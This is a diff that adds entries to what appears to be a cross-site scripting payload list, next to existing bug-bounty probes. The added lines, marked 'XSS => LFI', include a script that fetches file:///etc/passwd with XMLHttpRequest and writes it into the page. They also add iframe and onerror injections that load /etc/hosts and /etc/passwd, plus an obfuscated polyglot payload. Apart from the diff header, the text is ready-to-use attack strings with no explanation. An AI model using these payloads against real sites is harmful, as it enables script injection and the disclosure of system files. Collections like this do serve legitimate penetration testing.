@@ -7,3 +7,17 @@ x" onerror​="alert(1)
 '-confirm(/OPENBUGBOUNTY/)//
 <sVg/onfake="x=y"oNload​=prompt(/OPENBUGBOUNTY/)>
 website*com/test/%22%3c%2fscript%3e%3cscript%3ealert(1)%3c%2fscript%3e
+
+XSS => LFI
+<script>
+    x=new XMLHttpRequest;
+    x.onload=function(){
+        document.write(this.responseText)
+    };
+    x.open("GET","file:///etc/passwd");
+    x.send();
+</script>
+
+<script>document.write(%27<iframe%20src=file://///etc/hosts></iframe>%27);</script>
+<img src="xasdasdasd" onerror="document.write('<iframe src=file:///etc/passwd></iframe>')"/>
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
